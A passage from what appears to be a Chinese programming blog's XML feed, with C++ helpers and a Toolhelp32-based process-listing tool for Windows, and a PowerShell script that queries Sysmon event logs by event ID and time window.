false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">stricmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// ASCII字符 -> 宽字符</span>LPWSTR <span class="token function">toLPWSTR</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> dwLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> nwLen <span class="token operator">=</span> <span class="token function">MultiByteToWideChar</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">,</span> dwLen<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    LPWSTR lpwstr <span class="token operator">=</span> new WCHAR<span class="token punctuation">[</span>dwLen<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">MultiByteToWideChar</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">,</span> dwLen<span class="token punctuation">,</span> lpwstr<span class="token punctuation">,</span> nwLen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> lpwstr<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 把非 ASCII 字符替换成 ?</span><span class="token keyword">void</span> <span class="token function">delUnASCII</span><span class="token punctuation">(</span>LPWSTR wstr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    wchar_t<span class="token operator">*</span> p <span class="token operator">=</span> wstr<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token string">'?'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        p<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowerShell-源码"><a href="#PowerShell-源码" class="headerlink" title="PowerShell 源码"></a>PowerShell 源码</h2><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># get_sysmon_event.ps1</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># sysmon事件查询脚本</span><span class="token comment" spellcheck="true"># Powershell Script 3.0+</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 脚本使用方式:</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   .\get_sysmon_event.ps1 -id 1 -limit 10 -h 0 -m -5 -s 0</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># id: sysmon事件ID （默认值1）</span><span class="token comment" spellcheck="true">#       1   Process Creation</span><span class="token comment" spellcheck="true">#       2   Process Changed a File Creation Time</span><span class="token comment" spellcheck="true">#       3   Network Connection</span><span class="token comment" spellcheck="true">#       4   Sysmon Service State Changed</span><span class="token comment" spellcheck="true">#       5   Process Terminated</span><span class="token comment" spellcheck="true">#       6   Driver Loaded</span><span class="token comment" spellcheck="true">#       7   Image Loaded</span><span class="token comment" spellcheck="true">#       8   Create Remote Thread</span><span class="token comment" spellcheck="true">#       9   Raw Access Read</span><span class="token comment" spellcheck="true">#       10  Process Access</span><span class="token comment" spellcheck="true">#       11  File Create</span><span class="token comment" spellcheck="true">#       12  Registry Event (Object Create and Delete)</span><span class="token comment" spellcheck="true">#       13  Registry Event (Value Set)</span><span class="token comment" spellcheck="true">#       14  Registry Event (Key and Value Rename)</span><span class="token comment" spellcheck="true">#       15  File Create Stream Hash</span><span class="token comment" spellcheck="true">#       16  Sysmon Configuration Change</span><span class="token comment" spellcheck="true">#       17  Named Pipe Created</span><span class="token comment" spellcheck="true">#       18  Named Pipe Connected</span><span class="token comment" spellcheck="true">#       255 Error</span><span class="token comment" spellcheck="true"># limit: 限制单次查询最多获取的事件数 （默认值100）</span><span class="token comment" spellcheck="true"># h: &lt;=0 的整数，标识查询 h 小时内的事件</span><span class="token comment" spellcheck="true"># m: &lt;=0 的整数，标识查询 m 分钟内的事件</span><span class="token comment" spellcheck="true"># s: &lt;=0 的整数，标识查询 s 秒内的事件</span><span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=1<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$limit</span>=100<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$h</span>=0<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$m</span>=5<span class="token punctuation">,</span><span class="token namespace">[int]</span><span class="token variable">$s</span>=0<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">-lt</span> 1<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$id</span>=1<span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$limit</span> <span class="token operator">-lt</span> 1<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$limit</span>=100<span class="token punctuation">}</span><span class="token variable">$args</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"logname"</span><span class="token punctuation">,</span> <span class="token string">"Microsoft-Windows-Sysmon/Operational"</span><span class="token punctuation">)</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"StartTime"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddHours<span class="token punctuation">(</span><span class="token operator">-</span><span class="token variable">$h</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddMinutes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddSeconds<span class="token punctuation">(</span><span class="token operator">-</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$args</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">"EndTime"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">Get-Date</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Get<span class="token operator">-</span>WinEvent <span class="token operator">-</span>FilterHashtable <span class="token variable">$args</span> <span class="token operator">-</span>MaxEvents <span class="token variable">$limit</span> <span class="token punctuation">|</span> <span class="token function">Format-Table</span> <span class="token operator">-</span>Property message <span class="token operator">-</span>Wrap<span class="token comment" spellcheck="true"># Get-WinEvent -FilterHashtable $args -MaxEvents $limit | Where{$_.Message -notmatch 'keyword'} | Format-Table -Property message -Wrap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> PowerShell </tag>
            
            <tag> Sysmon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取 Windows 进程信息</title>
      <link href="/lang/getprocinfo/"/>
      <url>/lang/getprocinfo/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>PROCESSENTRY32 结构： <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32</a></li><li>MODULEENTRY32 结构： <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32</a></li></ul><blockquote><p><a href="../../download/get_process.zip">get_process.exe 下载</a></p></blockquote><h2 id="C-源码"><a href="#C-源码" class="headerlink" title="C++ 源码"></a>C++ 源码</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*************************************************************************************** * get_process.cpp *              * 进程信息查询脚本，使用方法: *   ./get_process.exe            :  查询当前所有进程信息 *   ./get_process.exe -id 1234   :  查询进程号为 1234 的进程信息 *   ./get_process.exe -name abcd :  查询进程名以 abcd 开头（忽略大小写）的进程信息 *  ***************************************************************************************/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;tlhelp32.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h></span></span><span class="token comment" spellcheck="true">/* 进程信息结构体: https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32typedef struct tagPROCESSENTRY32 {　　DWORD dwSize;                    // 此进程的结构体大小（字节）　　DWORD cntUsage;                  // 进程的引用计数（已废弃，固定值0）　　DWORD th32ProcessID;             // 进程号　　ULONG_PTR th32DefaultHeapID;     // 默认堆ID（已废弃，固定值0）　　DWORD th32ModuleID;              // 进程模块ID（已废弃，固定值0）　　DWORD cntThreads;                // 此进程创建的线程数　　DWORD th32ParentProcessID;       // 父进程号　　LONG pcPriClassBase;             // 此进程所创建的线程优先级　　DWORD dwFlags;                   // （已废弃，固定值0）　　TCHAR szExeFile[MAX_PATH];       // 进程的可执行文件的名称（不含路径，完整路径可通过 MODULEENTRY32->szExePath 获取）} PROCESSENTRY32, *PPROCESSENTRY32;*/</span><span class="token comment" spellcheck="true">/* 进程模块结构体: https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32typedef struct tagMODULEENTRY32 {  DWORD   dwSize;                           // 此模块的结构体大小（字节）  DWORD   th32ModuleID;                     // 模块ID（已废弃，固定值1）  DWORD   th32ProcessID;                    // 所属进程的进程号  DWORD   GlblcntUsage;                     // 负载计数（通常没有意义，一般情况下值为 0xFFFF）  DWORD   ProccntUsage;                     // 与 GlblcntUsage 相同  BYTE    *modBaseAddr;                     // 该模块在所属进程中的基址  DWORD   modBaseSize;                      // 模块大小（字节）  HMODULE hModule;                          // 该模块在所属进程中的句柄  char    szModule[MAX_MODULE_NAME32 + 1];  // 模块名称  char    szExePath[MAX_PATH];              // 模块路径} MODULEENTRY32;*/</span><span class="token keyword">void</span> <span class="token function">printSysError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// 打印系统异常</span><span class="token keyword">void</span> <span class="token function">printProc</span><span class="token punctuation">(</span>PROCESSENTRY32 pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打印进程信息到控制台</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">getProcessOwner</span><span class="token punctuation">(</span>DWORD pid<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 获取进程归属用户</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">toChar</span><span class="token punctuation">(</span><span class="token keyword">const</span> wchar_t<span class="token operator">*</span> _wchar<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 宽字符 -> ASCII字符</span>bool <span class="token function">startwith</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> substr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 判断 str 是否以 substr 开头（忽略大小写）</span><span class="token comment" spellcheck="true">/** * argc: 入参个数(至少为1: 第0个为执行文件文件名) * argv: 入参列表。当 argc!=3 时打印所有进程; 当 argc==3 时: *   -id {pid} : 打印进程号为 pid 的进程信息 *   -name {pname} : 打印进程名为以 pname 开头的进程信息（忽略大小写，若有多个则只打印第一个） */</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 提取入参</span>    <span class="token keyword">int</span> exPid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 期望查询的进程号</span>    <span class="token keyword">char</span><span class="token operator">*</span> exPname <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 期望查询的进程名</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            exPid <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">equal</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"-name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            exPname <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 拍摄当前系统所有进程快照</span>    HANDLE hProcess <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hProcess <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error] Fail to take processes snapshot.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printSysError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    PROCESSENTRY32 pe32<span class="token punctuation">;</span>    pe32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>    BOOL hasNext <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Process32First</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 进程快照列表迭代器</span>    <span class="token comment" spellcheck="true">// 打印特定进程信息</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>exPid <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span>exPname<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>hasNext<span class="token punctuation">)</span> <span class="token punctuation">{</span>            DWORD pid <span class="token operator">=</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>            <span class="token keyword">char</span><span class="token operator">*</span> pname <span class="token operator">=</span> <span class="token function">toChar</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span> exPid<span class="token punctuation">)</span> <span class="token operator">==</span> pid <span class="token operator">||</span> <span class="token function">startwith</span><span class="token punctuation">(</span>pname<span class="token punctuation">,</span> exPname<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">printProc</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>                flag <span class="token operator">=</span> true<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            delete<span class="token punctuation">[</span><span class="token punctuation">]</span> pname<span class="token punctuation">;</span>            hasNext <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> false<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error] The process is not exists.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 打印所有进程信息</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>hasNext<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printProc</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>            hasNext <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 清除快照对象</span>    <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// system("pause");</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 打印系统异常</span><span class="token keyword">void</span> <span class="token function">printSysError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    DWORD errId<span class="token punctuation">;</span>    TCHAR errMsg<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    TCHAR<span class="token operator">*</span> p<span class="token punctuation">;</span>    errId <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FormatMessage</span><span class="token punctuation">(</span>FORMAT_MESSAGE_FROM_SYSTEM <span class="token operator">|</span> FORMAT_MESSAGE_IGNORE_INSERTS<span class="token punctuation">,</span>                     <span class="token constant">NULL</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span>                     <span class="token function">MAKELANGID</span><span class="token punctuation">(</span>LANG_NEUTRAL<span class="token punctuation">,</span> SUBLANG_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">,</span>                    errMsg<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> errMsg<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>p <span class="token operator">></span> <span class="token number">31</span> <span class="token operator">||</span> <span class="token operator">*</span>p <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">++</span>p<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token operator">*</span>p<span class="token operator">--</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>p <span class="token operator">>=</span> errMsg <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>p <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token operator">||</span> <span class="token operator">*</span>p <span class="token operator">&lt;</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_tprintf</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"[Error %d] %s\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> errId<span class="token punctuation">,</span> errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 打印进程信息到控制台</span><span class="token keyword">void</span> <span class="token function">printProc</span><span class="token punctuation">(</span>PROCESSENTRY32 pe32<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Process Info]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name: %s\n"</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pid: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ppid: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>th32ParentProcessID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"owner: %s\n"</span><span class="token punctuation">,</span> <span class="token function">getProcessOwner</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"dwSize: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cntThreads: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>cntThreads<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pcPriClassBase: %ld\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>pcPriClassBase<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 拍摄当前进程模块列表快照</span>    HANDLE hModule <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPMODULE<span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hModule <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// printf("[Error] Fail to take process snapshot\n");</span>        <span class="token comment" spellcheck="true">// printSysError();</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"path: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        